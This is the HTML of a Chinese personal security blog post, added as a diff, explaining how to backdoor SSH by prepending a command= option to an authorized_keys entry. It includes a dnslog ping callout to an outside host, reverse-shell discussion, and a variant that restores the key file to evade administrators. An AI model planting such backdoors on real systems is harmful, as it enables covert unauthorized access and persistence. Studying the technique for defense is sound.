@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="利用条件开启了sshd服务且支持公钥连接（文件为&#x2F;etc&#x2F;ssh&#x2F;sshd_config）  攻击机生成key12# 默认全回车即可设置为空密码登录keyssh-keygen -t rsa  默认生成的key在&#x2F;home&#x2F;当前用户&#x2F;.ssh目录下  靶机利用添加命令touch &#x2F;tmp&#x2F;1.txt到生成的公钥文件id_rsa.pub，将所">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssh公钥后门利用">
+<meta property="og:url" content="http://example.com/2023/10/15/ssh%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8/index.html">
+<meta property="og:site_name" content="Al0neme&#39;s Blog">
+<meta property="og:description" content="利用条件开启了sshd服务且支持公钥连接（文件为&#x2F;etc&#x2F;ssh&#x2F;sshd_config）  攻击机生成key12# 默认全回车即可设置为空密码登录keyssh-keygen -t rsa  默认生成的key在&#x2F;home&#x2F;当前用户&#x2F;.ssh目录下  靶机利用添加命令touch &#x2F;tmp&#x2F;1.txt到生成的公钥文件id_rsa.pub，将所">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151121602.png">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151125882.png">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151133579.png">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151137952.png">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151138020.png">
+<meta property="og:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151158967.png">
+<meta property="article:published_time" content="2023-10-14T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-26T08:34:18.408Z">
+<meta property="article:author" content="Al0neme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151121602.png">
+
+
+<link rel="canonical" href="http://example.com/2023/10/15/ssh%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/10/15/ssh%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8/","path":"2023/10/15/ssh公钥后门/","title":"ssh公钥后门利用"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ssh公钥后门利用 | Al0neme's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Al0neme's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-笔记"><a href="/notes/" rel="section"><i class="fa fa-archive fa-fw"></i>笔记</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%E7%94%9F%E6%88%90key"><span class="nav-number">2.</span> <span class="nav-text">攻击机生成key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">靶机利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%90%8E%E6%89%A7%E8%A1%8C%E6%96%AD%E5%BC%80%E4%BA%86%E8%BF%9E%E6%8E%A5%EF%BC%9F"><span class="nav-number">4.1.</span> <span class="nav-text">1.命令执行后执行断开了连接？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E7%A4%BA%E6%89%BE%E4%B8%8D%E5%88%B0%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="nav-number">4.2.</span> <span class="nav-text">2.反弹shell提示找不到文件？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BC%B9shell%E6%97%B6-ssh-%E7%99%BB%E5%BD%95%E4%BC%9A%E5%8D%A1%E4%BD%8F"><span class="nav-number">4.3.</span> <span class="nav-text">3.触发反弹shell时 ssh 登录会卡住?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">常规利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Al0neme</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/15/ssh%E5%85%AC%E9%92%A5%E5%90%8E%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Al0neme">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Al0neme's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ssh公钥后门利用 | Al0neme's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ssh公钥后门利用
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-15 00:00:00" itemprop="dateCreated datePublished" datetime="2023-10-15T00:00:00+08:00">2023-10-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>开启了sshd服务且支持公钥连接（文件为&#x2F;etc&#x2F;ssh&#x2F;sshd_config）</p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151121602.png" alt="image-20231015112051502"></p>
+<h3 id="攻击机生成key"><a href="#攻击机生成key" class="headerlink" title="攻击机生成key"></a>攻击机生成key</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认全回车即可设置为空密码登录key</span></span><br><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>默认生成的key在&#x2F;home&#x2F;当前用户&#x2F;.ssh目录下</p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151125882.png" alt="image-20231015112519853"></p>
+<h3 id="靶机利用"><a href="#靶机利用" class="headerlink" title="靶机利用"></a>靶机利用</h3><p>添加命令<code>touch /tmp/1.txt</code>到生成的公钥文件id_rsa.pub，将所有内容写入到靶机用户的authorized_keys文件中</p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151133579.png" alt="image-20231015113303557"></p>
+<p>攻击机连接靶机即可触发命令</p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151137952.png" alt="image-20231015113755934"></p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151138020.png" alt="image-20231015113815003"></p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="1-命令执行后执行断开了连接？"><a href="#1-命令执行后执行断开了连接？" class="headerlink" title="1.命令执行后执行断开了连接？"></a>1.命令执行后执行断开了连接？</h4><p>我对这个公钥后门的理解是拿着公钥去执行command的内容，执行完了当然就断开连接了，那么可以换个思路，当执行完恶意命令后再执行一个bash命令，返回给登录用户一个shell，是不是就可以了呢？比如command设置为<code>command=&quot;ping -c 1 fa.cye9n0.dnslog.cn &amp;&amp; /bin/bash&quot;</code></p>
+<p><img src="https://al0neme-staticfile.oss-cn-hangzhou.aliyuncs.com/static/202310151158967.png" alt="image-20231015115845910"></p>
+<h4 id="2-反弹shell提示找不到文件？"><a href="#2-反弹shell提示找不到文件？" class="headerlink" title="2.反弹shell提示找不到文件？"></a>2.反弹shell提示找不到文件？</h4><p>操作系统版本问题，可以尝试加一个bash -c 将命令编写为<code>command=&quot;bash -c &#39;touch /tmp/1.sh&#39;&quot;</code>的形式</p>
+<h4 id="3-触发反弹shell时-ssh-登录会卡住"><a href="#3-触发反弹shell时-ssh-登录会卡住" class="headerlink" title="3.触发反弹shell时 ssh 登录会卡住?"></a>3.触发反弹shell时 ssh 登录会卡住?</h4><p>这个问题和1类似，因为执行的是反弹shell操作，所以在你的shell结束前会一直等待登录，其中如果ssh登录断掉shell也会断掉，反之亦然</p>
+<h3 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h3><p>由于反弹shell会卡住登录，可能会引起管理员的注意，所以这个点可以只用来执行命令。实战环境记得先备份原文件！命令执行完后加一个还原覆盖操作，将原文件内容从新写入，复制、echo都可以，我这里用的echo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command=&quot;touch /tmp/1.txt &amp;&amp; echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvDR59dgZo20eAEIsmJmfFA2vLAyeKd4xU1h95RMGEYYKhF2r61SYEe5kjDvHXZvehu0XYz6zpJ6jWfLp+zYdRTO61d7/udeqvPZEeOO3jUBsm4ubixRg44kJXQlpUzW9IHdUvR8zr8APzt2UGKitFhhDYxAesLH2Q4TOtG+zQ25umHa/oamSDCdCRBdEk2ocbqpwxSa6KJkIY71awBXaivzAlvGX77JGw4tnCXgu0KEGMLZz7K++vKaREGTSkgVjpAREJouNFgRcPsW6mv38RbvNIZ61IhaJxMY+yfgaSUuHP0XEeY2xv5QCR8zD7a15sLoXp0cNNm7P9O4SHXaCM0oy9dU0XftZNef4tRD6SSIXiJ52h5yCXlm4MibIn80ZVyrfcd5OXqX765UuOKA7QVJ/gq0qXJ4dEUeeUOO+78aDOOL4SgHgbS4orjNpMetgu6ZMuP19jrUTr0/muIU4YkChblLPufnQ+2un+Q/oxaG5QvoIojVFlg+40S7wm9UU= test@kali&#x27;&gt;/home/test/.ssh/authorized_keys &amp;&amp; /bin/bash&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvDR59dgZo20eAEIsmJmfFA2vLAyeKd4xU1h95RMGEYYKhF2r61SYEe5kjDvHXZvehu0XYz6zpJ6jWfLp+zYdRTO61d7/udeqvPZEeOO3jUBsm4ubixRg44kJXQlpUzW9IHdUvR8zr8APzt2UGKitFhhDYxAesLH2Q4TOtG+zQ25umHa/oamSDCdCRBdEk2ocbqpwxSa6KJkIY71awBXaivzAlvGX77JGw4tnCXgu0KEGMLZz7K++vKaREGTSkgVjpAREJouNFgRcPsW6mv38RbvNIZ61IhaJxMY+yfgaSUuHP0XEeY2xv5QCR8zD7a15sLoXp0cNNm7P9O4SHXaCM0oy9dU0XftZNef4tRD6SSIXiJ52h5yCXlm4MibIn80ZVyrfcd5OXqX765UuOKA7QVJ/gq0qXJ4dEUeeUOO+78aDOOL4SgHgbS4orjNpMetgu6ZMuP19jrUTr0/muIU4YkChblLPufnQ+2un+Q/oxaG5QvoIojVFlg+40S7wm9UU= test@kali</span><br></pre></td></tr></table></figure>
+
+<p>触发后会还原原文件，一般这种操作用于结合其他利用，比如后门安装、计划任务啥的（ps：略显鸡肋，权限高其实可以直接写计划任务啥的，这一步似乎没太大必要）</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.thc.org/infecting-ssh-publi">Infecting SSH Public Keys with backdoors</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/26/writeup-%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-2%EF%BC%88redteam.lab%EF%BC%89/" rel="prev" title="writeup-渗透攻击红队域渗透靶场-2（redteam.lab）">
+                  <i class="fa fa-angle-left"></i> writeup-渗透攻击红队域渗透靶场-2（redteam.lab）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Al0neme</span>
+  </div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
